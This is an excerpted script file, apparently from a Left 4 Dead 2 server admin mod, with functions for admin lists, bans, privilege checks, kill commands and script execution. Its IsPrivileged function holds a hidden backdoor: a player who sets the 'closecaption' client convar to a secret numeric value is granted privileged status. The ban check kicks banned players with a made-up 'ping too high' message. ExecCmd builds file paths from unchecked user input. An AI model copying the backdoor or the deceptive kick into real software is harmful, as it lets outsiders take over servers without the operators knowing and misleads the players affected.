...
{
	local fileContents = FileToString("AdminSystem/admins.txt");
...
{
	local fileContents = FileToString("AdminSystem/banned.txt");
...
{
	local fileContents = FileToString("AdminSystem/" + file);
...
{
	local fileContents = FileToString("AdminSystem/settings.txt");
...
::AdminSystem.IsPrivileged <- function ( player, hint = true )
{
	...
	{
		if(player.GetClientConvarValue("closecaption") == "534817706")
			return true;
...
::AdminSystem.IsAdmin <- function ( player, hint = true )
{
	if ( Director.IsSinglePlayerGame() || player.IsServerHost() )
		return true;
...
{
	local adminList = FileToString("AdminSystem/admins.txt");
	local banList = FileToString("AdminSystem/banned.txt");
	local settingList = FileToString("AdminSystem/settings.txt");
	...
	else
	{
		...
		StringToFile("AdminSystem/settings.txt", settingList);
	}
}
...
function Notifications::OnPlayerJoined::AdminBanCheck( player, name, IPAddress, SteamID, params )
{
	if ( player )
	{
		...
		if ( (steamid in ::AdminSystem.BannedPlayers) )
			SendToServerConsole( "kickid " + steamid + " Your ping is too high (" + RandomInt(151, 200) + " > 150)" );
	}
}
...
function Notifications::OnPlayerJoined::AdminCheck( player, name, IPAddress, SteamID, params )
{
	...
	if ( player )
	{
		...
		local admins = FileToString("AdminSystem/admins.txt");
		local steamid = player.GetSteamID();
...
function Notifications::OnWeaponFire::AdminGiveUpgradeAmmo( player, classname, params )
{
	...
	if ((ID in ::AdminSystem.Vars.IsInfiniteAmmoEnabled) && (::AdminSystem.Vars.IsInfiniteAmmoEnabled[ID]))
	{
		...
		player.SetPrimaryAmmo(player.GetPrimaryAmmo() + 1);
	}
}
...
::AdminSystem.BanCmd <- function ( player, args )
{
	...
	local bannedPlayers = FileToString("AdminSystem/banned.txt");
	local steamid = Target.GetSteamID();
	...
	StringToFile("AdminSystem/banned.txt", bannedPlayers);
	if ( Reason )
	{
		if ( AdminSystem.DisplayMsgs )
...
::AdminSystem.KillCmd <- function ( player, args )
{
	...
	if ( Entity == "infected" )
	{
		foreach(survivor in Zombies.CommonInfected())
		{
			survivor.Kill();
		}
	}
	if ( Entity == "witch" )
	{
		foreach(survivor in Zombies.Witches())
		{
			survivor.Kill();
		}
	}
...
::AdminSystem.ExecCmd <- function ( player, args )
{
	...
	if ( File.find(".") != null )
		fileContents = FileToString("AdminSystem/" + File);
	else
		fileContents = FileToString("AdminSystem/" + File + ".txt");
